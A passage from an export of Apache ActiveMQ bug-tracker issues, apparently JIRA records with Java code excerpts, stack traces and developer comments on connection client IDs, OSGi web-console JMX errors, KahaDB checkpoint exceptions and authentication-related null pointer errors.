                        .lookup(outboundTopicConnectionFactoryName, TopicConnectionFactory.class);
                    if (outboundUsername != null) {
                        outboundTopicConnection = outboundTopicConnectionFactory
                            .createTopicConnection(outboundUsername, outboundPassword);
                    } else {
                        outboundTopicConnection = outboundTopicConnectionFactory.createTopicConnection();
                    }
                } else {
                    throw new JMSException(""Cannot create localConnection - no information"");
                }
            } else {
                if (outboundUsername != null) {
                    outboundTopicConnection = outboundTopicConnectionFactory
                        .createTopicConnection(outboundUsername, outboundPassword);
                } else {
                    outboundTopicConnection = outboundTopicConnectionFactory.createTopicConnection();
                }
            }
        }
>>>>    if (localClientId != null && localClientId.length() > 0) {           // CHECKS for existence of localClientId
            outboundTopicConnection.setClientID(getOutboundClientId());      // THEN uses outboundClientId
        }
        outboundTopicConnection.start();
    }

{code}

I'm thinking the above code should check for existence of outboundClientId instead of localClientId

Compare this to:

{code}
    protected void initializeLocalTopicConnection() throws NamingException, JMSException {
        if (localTopicConnection == null) {
            // get the connection factories
            if (localTopicConnectionFactory == null) {
                if (embeddedConnectionFactory == null) {
                    // look it up from JNDI
                    if (localConnectionFactoryName != null) {
                        localTopicConnectionFactory = (TopicConnectionFactory)jndiLocalTemplate
                            .lookup(localConnectionFactoryName, TopicConnectionFactory.class);
                        if (localUsername != null) {
                            localTopicConnection = localTopicConnectionFactory
                                .createTopicConnection(localUsername, localPassword);
                        } else {
                            localTopicConnection = localTopicConnectionFactory.createTopicConnection();
                        }
                    } else {
                        throw new JMSException(""Cannot create localConnection - no information"");
                    }
                } else {
                    localTopicConnection = embeddedConnectionFactory.createTopicConnection();
                }
            } else {
                if (localUsername != null) {
                    localTopicConnection = localTopicConnectionFactory.createTopicConnection(localUsername,
                                                                                             localPassword);
                } else {
                    localTopicConnection = localTopicConnectionFactory.createTopicConnection();
                }
            }
        }
>>>>        if (localClientId != null && localClientId.length() > 0) {    // CHECKS for existence of localClientId
            localTopicConnection.setClientID(getLocalClientId());         // THEN uses localClientId
        }
        localTopicConnection.start();
    }

{code}",running 5.4.2 on linux.,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,220695,,,Tue Jan 31 21:56:59 UTC 2012,,,,,,,,,,,"0|i0aifb:",59258,,,,,,,,,,,,,,,,,,,,,"25/Jan/12 00:31;tabish;Looks like you might be right.  A good way forward is to create a unit test that validates the problem and submit a patch that corrects it.  ;;;","31/Jan/12 21:56;tabish;fixed in svn rev: 1238827;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
[OSGi] activemq-web-console: exception after restart container,AMQ-3633,12534938,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,amarkevich,amarkevich,13/Dec/11 11:55,02/Mar/16 18:43,14/Jul/23 05:43,19/Sep/12 13:09,5.5.0,,,,,5.7.0,,,,,,,0,,,,,,,,,"I installed activemq-web-console feature as described in [1].
Afer restart container there is exception in console:

2011-12-13 14:51:32,906 [.ops4j.pax.web)] INFO  XBeanXmlBeanDefinitionReader   - Loading XML bean definitions from ServletContext resource [/WEB-INF/activemq.xml]
Exception in thread ""JMX Connector Thread [service:jmx:rmi://localhost:44444/jndi/rmi://localhost:1099/karaf-root]"" java.lang.RuntimeException: Could not start JMX connector server
        at org.apache.karaf.management.ConnectorServerFactory$1.run(ConnectorServerFactory.java:234)
Caused by: java.io.IOException: Cannot bind to URL [rmi://localhost:1099/karaf-root]: javax.naming.CommunicationException [Root exception is java.rmi.ServerException: RemoteException occurred in serve
r thread; nested exception is:
        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub not found by org.apache.activemq.activemq-web-console [78] (no security manager: RMI class loader disabled)]
        at javax.management.remote.rmi.RMIConnectorServer.newIOException(RMIConnectorServer.java:804)
        at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:417)
        at org.apache.karaf.management.ConnectorServerFactory$1.run(ConnectorServerFactory.java:232)
Caused by: javax.naming.CommunicationException [Root exception is java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub not found by org.apache.activemq.activemq-web-console [78] (no security manager: RMI class loader disabled)]
        at com.sun.jndi.rmi.registry.RegistryContext.bind(RegistryContext.java:126)
        at com.sun.jndi.toolkit.url.GenericURLContext.bind(GenericURLContext.java:208)
        at javax.naming.InitialContext.bind(InitialContext.java:400)
        at javax.management.remote.rmi.RMIConnectorServer.bind(RMIConnectorServer.java:625)
        at javax.management.remote.rmi.RMIConnectorServer.start(RMIConnectorServer.java:412)
        ... 1 more
Caused by: java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub not found by org.apache.activemq.activemq-web-console [78] (no security manager: RMI class loader disabled)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:400)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:248)
        at sun.rmi.transport.Transport$1.run(Transport.java:159)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:255)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:233)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:359)
        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)
        at com.sun.jndi.rmi.registry.RegistryContext.bind(RegistryContext.java:120)
        ... 5 more
Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub not found by org.apache.activemq.activemq-web-console [78] (no security manager: RMI class loader disabled)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:390)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:248)
        at sun.rmi.transport.Transport$1.run(Transport.java:159)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
Caused by: java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub not found by org.apache.activemq.activemq-web-console [78] (no security manager: RMI class loader disabled)
        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:373)
        at sun.rmi.server.LoaderHandler.loadClass(LoaderHandler.java:163)
        at java.rmi.server.RMIClassLoader$2.loadClass(RMIClassLoader.java:620)
        at java.rmi.server.RMIClassLoader.loadClass(RMIClassLoader.java:247)
        at sun.rmi.server.MarshalInputStream.resolveClass(MarshalInputStream.java:197)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1574)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1495)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1731)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1328)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:350)
        ... 12 more

1. http://activemq.apache.org/osgi-integration.html",karaf 2.2.4,davsclaus,djencks,gcollins,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4794,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,220622,,,Wed Mar 02 18:43:40 UTC 2016,,,,,,,,,,,"0|i07frj:",41320,,,,,,,,,,,,,,,,,,,,,"19/Sep/12 13:08;davsclaus;I think the JMX has been fixed on trunk. Can you try with 5.7 when its released. Or the 5.7-SNAPSHOT.
;;;","24/Oct/12 01:15;gcollins;Are we sure this is fixed? I just reproduced on activemq 5.7.0 with karaf 2.3.0:



java.io.IOException: java.lang.RuntimeException: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException [Root exception is java.rmi.UnmarshalException: error unmarshalling return; nested exception is: 
	java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub (no security manager: RMI class loader disabled)]
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:92)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)[78:org.eclipse.jetty.servlet:7.6.7.v20120910]
	at com.opensymphony.sitemesh.webapp.SiteMeshFilter.obtainContent(SiteMeshFilter.java:129)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at com.opensymphony.sitemesh.webapp.SiteMeshFilter.doFilter(SiteMeshFilter.java:77)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)[78:org.eclipse.jetty.servlet:7.6.7.v20120910]
	at org.ops4j.pax.web.service.internal.WelcomeFilesFilter.doFilter(WelcomeFilesFilter.java:193)[87:org.ops4j.pax.web.pax-web-runtime:1.1.3]
	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1300)[78:org.eclipse.jetty.servlet:7.6.7.v20120910]
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:445)[78:org.eclipse.jetty.servlet:7.6.7.v20120910]
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceServletHandler.doHandle(HttpServiceServletHandler.java:70)[88:org.ops4j.pax.web.pax-web-jetty:1.1.3]
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:137)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:559)[77:org.eclipse.jetty.security:7.6.7.v20120910]
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:227)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1038)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.ops4j.pax.web.service.jetty.internal.HttpServiceContext.doHandle(HttpServiceContext.java:117)[88:org.ops4j.pax.web.pax-web-jetty:1.1.3]
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:374)[78:org.eclipse.jetty.servlet:7.6.7.v20120910]
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:189)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:972)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:135)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.ops4j.pax.web.service.jetty.internal.JettyServerHandlerCollection.handle(JettyServerHandlerCollection.java:74)[88:org.ops4j.pax.web.pax-web-jetty:1.1.3]
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:116)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.Server.handle(Server.java:359)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:483)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.BlockingHttpConnection.handleRequest(BlockingHttpConnection.java:53)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:920)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:982)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:635)[72:org.eclipse.jetty.http:7.6.7.v20120910]
	at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:235)[72:org.eclipse.jetty.http:7.6.7.v20120910]
	at org.eclipse.jetty.server.BlockingHttpConnection.handle(BlockingHttpConnection.java:72)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.server.nio.BlockingChannelConnector$BlockingChannelEndPoint.run(BlockingChannelConnector.java:298)[76:org.eclipse.jetty.server:7.6.7.v20120910]
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:608)[70:org.eclipse.jetty.util:7.6.7.v20120910]
	at org.eclipse.jetty.util.thread.QueuedThreadPool$3.run(QueuedThreadPool.java:543)[70:org.eclipse.jetty.util:7.6.7.v20120910]
	at java.lang.Thread.run(Unknown Source)[:1.7.0_05]
Caused by: java.lang.RuntimeException: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException [Root exception is java.rmi.UnmarshalException: error unmarshalling return; nested exception is: 
	java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub (no security manager: RMI class loader disabled)]
	at org.apache.activemq.web.RemoteJMXBrokerFacade.createConnection(RemoteJMXBrokerFacade.java:165)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at org.apache.activemq.web.RemoteJMXBrokerFacade.getMBeanServerConnection(RemoteJMXBrokerFacade.java:114)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at org.apache.activemq.web.RemoteJMXBrokerFacade.getBrokerAdmin(RemoteJMXBrokerFacade.java:88)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at org.apache.activemq.web.BrokerFacadeSupport.isSlave(BrokerFacadeSupport.java:231)[117:org.apache.activemq.activemq-web-console:5.7.0]
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:86)[117:org.apache.activemq.activemq-web-console:5.7.0]
	... 31 more
Caused by: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException [Root exception is java.rmi.UnmarshalException: error unmarshalling return; nested exception is: 
	java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub (no security manager: RMI class loader disabled)]
	at javax.management.remote.rmi.RMIConnector.connect(Unknown Source)[:1.7.0_05]
	at javax.management.remote.JMXConnectorFactory.connect(Unknown Source)[:1.7.0_05]
	at org.apache.activemq.web.RemoteJMXBrokerFacade.createConnection(RemoteJMXBrokerFacade.java:146)[117:org.apache.activemq.activemq-web-console:5.7.0]
	... 35 more
Caused by: javax.naming.CommunicationException [Root exception is java.rmi.UnmarshalException: error unmarshalling return; nested exception is: 
	java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub (no security manager: RMI class loader disabled)]
	at com.sun.jndi.rmi.registry.RegistryContext.lookup(Unknown Source)[:1.7.0_05]
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(Unknown Source)[:1.7.0_05]
	at javax.naming.InitialContext.lookup(Unknown Source)[:1.7.0_05]
	at javax.management.remote.rmi.RMIConnector.findRMIServerJNDI(Unknown Source)[:1.7.0_05]
	at javax.management.remote.rmi.RMIConnector.findRMIServer(Unknown Source)[:1.7.0_05]
	... 38 more
Caused by: java.rmi.UnmarshalException: error unmarshalling return; nested exception is: 
	java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub (no security manager: RMI class loader disabled)
	at sun.rmi.registry.RegistryImpl_Stub.lookup(Unknown Source)[:1.7.0_05]
	... 43 more
Caused by: java.lang.ClassNotFoundException: javax.management.remote.rmi.RMIServerImpl_Stub (no security manager: RMI class loader disabled)
	at sun.rmi.server.LoaderHandler.loadClass(Unknown Source)[:1.7.0_05]
	at sun.rmi.server.LoaderHandler.loadClass(Unknown Source)[:1.7.0_05]
	at java.rmi.server.RMIClassLoader$2.loadClass(Unknown Source)[:1.7.0_05]
	at java.rmi.server.RMIClassLoader.loadClass(Unknown Source)[:1.7.0_05]
	at sun.rmi.server.MarshalInputStream.resolveClass(Unknown Source)[:1.7.0_05]
	at java.io.ObjectInputStream.readNonProxyDesc(Unknown Source)[:1.7.0_05]
	at java.io.ObjectInputStream.readClassDesc(Unknown Source)[:1.7.0_05]
	at java.io.ObjectInputStream.readOrdinaryObject(Unknown Source)[:1.7.0_05]
	at java.io.ObjectInputStream.readObject0(Unknown Source)[:1.7.0_05]
	at java.io.ObjectInputStream.readObject(Unknown Source)[:1.7.0_05]
	... 44 more
;;;","24/Nov/12 08:53;gcollins;One additional thing to note - it works fine with equinox 3.6 but fails with equinox 3.8.;;;","02/Mar/16 18:43;djencks;Based on some experiments I'm doing with the activemq web console installed as an esa in WAS Liberty (which runs on equinox) I very much doubt this is a problem that can be solved in activemq.  The problem appears to be that the jdk code is attempting to use a bundle classloader to load it's own classes.  I find that adding the relevant package to the boot delegation allows this to work.  For me this is done by adding the framework property

org.osgi.framework.bootdelegation=javax.management.remote.rmi

You might need other boot delegation packages as well, so this particular setting might not be appropriate everywhere.

Equinox can also have implicit boot delegation, although this seems to have a fairly large performance penalty.  I'm not sure which versions of equinox have this on or off by default; this might explain the difference in behavior between equinox 3.6 and 3.8.  To turn it on (unless otherwise disabled by launch code):

osgi.context.bootdelegation=true
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkBridgeFilterFactory should be assigned to Queue not NetworkBridge,AMQ-3630,12534603,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,wangyin,wangyin,10/Dec/11 15:14,13/Apr/12 12:26,14/Jul/23 05:43,13/Apr/12 12:26,5.6.0,,,,,5.6.0,,,Broker,,,,0,network,NetworkBridgeFilterFactory,,,,,,,"We can assign NetworkBridgeFilterFactory such as DefaultNetworkBridgeFilterFactory or conditionalNetworkBridgeFilterFactory for queue.But the source code on the trunk,class DemandForwardingBridgeSupport in fact, assigns NetworkBridgeFilterFactory to NetworkBridge,this causes DefaultNetworkBridgeFilterFactory will be applied at first even though specifying conditionalNetworkBridgeFilterFactory for the queue.The solution is making property filterFactory of DemandForwardingBridgeSupport to be a local variable in the method createNetworkBridgeFilter.",5.6.0 on the trunk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,220324,,,Fri Apr 13 12:26:33 UTC 2012,,,,,,,,,,,"0|i0aifz:",59261,,,,,,,,,,,,,,,,,,,,,"24/Jan/12 20:52;tabish;Do you have a test case for this?  Care to submit a test and a patch for it?;;;","13/Apr/12 06:11;rajdavies;Not seeing this in the code - a patch would help :). Moving this to 5.6.1 in hope of a patch;;;","13/Apr/12 12:26;gtully;The observation is correct, the filter should be evaluated per destination.
fix in http://svn.apache.org/viewvc?rev=1325735&view=rev;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AMQ3567Test doesn't clean up appender after AMQ-3623 update,AMQ-3628,12534386,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,slewis,slewis,08/Dec/11 19:02,09/Dec/11 11:39,14/Jul/23 05:43,09/Dec/11 11:39,,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Left the appender added to the root appender when I updated AMQ3567Test as part of AMQ-3623, so here's a patch that ensures that appender is cleaned up, thanks Claudio for spotting that.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Dec/11 19:02;slewis;0001-Clean-up-appender.patch;https://issues.apache.org/jira/secure/attachment/12506642/0001-Clean-up-appender.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,220108,,,Fri Dec 09 11:39:46 UTC 2011,,,,,,,Patch Available,,,,"0|i0aig7:",59262,,,,,,,,,,,,,,,,,,,,,"09/Dec/11 11:39;gtully;update applied with thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
IndexOutOfBoundsException in org.apache.activemq.store.kahadb.MessageDatabase.getFirstInProgressTxLocation(),AMQ-3627,12534341,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,gtully,joerg.wassmer,joerg.wassmer,08/Dec/11 12:59,02/May/13 02:29,14/Jul/23 05:43,08/Dec/11 13:11,5.5.1,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"Following error is happening once a day. The messages in the affected queue are hanging until restart.

{noformat}
java.lang.IndexOutOfBoundsException: Index: 0, Size: 0
        at java.util.ArrayList.rangeCheck(ArrayList.java:604)
        at java.util.ArrayList.get(ArrayList.java:382)
        at java.util.Collections$SynchronizedList.get(Collections.java:1873)
        at org.apache.activemq.store.kahadb.MessageDatabase.getFirstInProgressTxLocation(MessageDatabase.java:430)
        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:1168)
        at org.apache.activemq.store.kahadb.MessageDatabase$10.execute(MessageDatabase.java:730)
        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)
        at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:728)
        at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:303)

KahaDB: Recovering checkpoint thread after death
{noformat}
",ActiveMQ 5.5.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-2922,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,220063,,,Thu Dec 08 13:12:42 UTC 2011,,,,,,,,,,,"0|i0aigf:",59263,,,,,,,,,,,,,,,,,,,,,"08/Dec/11 13:04;joerg.wassmer;Happens in line ""inflightTransactions.values().iterator().next().get(0)"".

{noformat}
    public Location getFirstInProgressTxLocation() {
        Location l = null;
        synchronized (inflightTransactions) {
            if (!inflightTransactions.isEmpty()) {
                l = inflightTransactions.values().iterator().next().get(0).getLocation();
            }
            if (!preparedTransactions.isEmpty()) {
                Location t = preparedTransactions.values().iterator().next().get(0).getLocation();
                if (l==null || t.compareTo(l) <= 0) {
                    l = t;
                }
            }
        }
        return l;
    }
{noformat};;;","08/Dec/11 13:11;gtully;Already fixed on trunk: http://svn.apache.org/viewvc?view=revision&revision=1170201
as part of https://issues.apache.org/jira/browse/AMQ-2922

Can you validate with a 5.6-SNAPSHOT;;;","08/Dec/11 13:12;gtully;This issue popped up in the testing of mKahaDB and got resolved;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointer Exceptions when networked broker sends certificate with an invalid user name,AMQ-3625,12534229,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,slewis,slewis,07/Dec/11 18:47,28/Dec/11 19:17,14/Jul/23 05:43,28/Dec/11 19:17,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Couple NPEs pop out when a connecting one broker to another using authentication if the authentication fails:

WARN | Failed to add Connection ID:Susan-Javureks-MacBook-Pro-3.local-53150-1322608354523-5:1, reason: java.lang.SecurityException: User name [null] or password is invalid. No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=US
WARN | Async error occurred: java.lang.SecurityException: User name [null] or password is invalid. No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=US
java.lang.SecurityException: User name [null] or password is invalid. No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=US
at org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:102)
at org.apache.activemq.broker.BrokerFilter.addConnection(BrokerFilter.java:85)
at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:91)
at org.apache.activemq.broker.TransportConnection.processAddConnection(TransportConnection.java:707)
at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:77)
at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:139)
at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:227)
at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:91)
at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:223)
at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:205)
at java.lang.Thread.run(Thread.java:680)
Caused by: javax.security.auth.login.FailedLoginException: No user for client certificate: CN=Dave Stanley, OU=FuseSource, O=Progress, L=Unknown, ST=MA, C=US
at org.apache.activemq.jaas.CertificateLoginModule.login(CertificateLoginModule.java:93)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
at java.lang.reflect.Method.invoke(Method.java:597)
at javax.security.auth.login.LoginContext.invoke(LoginContext.java:769)
at javax.security.auth.login.LoginContext.access$000(LoginContext.java:186)
at javax.security.auth.login.LoginContext$4.run(LoginContext.java:683)
at java.security.AccessController.doPrivileged(Native Method)
at javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:680)
at javax.security.auth.login.LoginContext.login(LoginContext.java:579)
at org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:87)
... 15 more
{color:red}WARN | Async error occurred: java.lang.NullPointerException
java.lang.NullPointerException{color}
at org.apache.activemq.broker.TransportConnection.processAddProducer(TransportConnection.java:512)
at org.apache.activemq.command.ProducerInfo.visit(ProducerInfo.java:105)
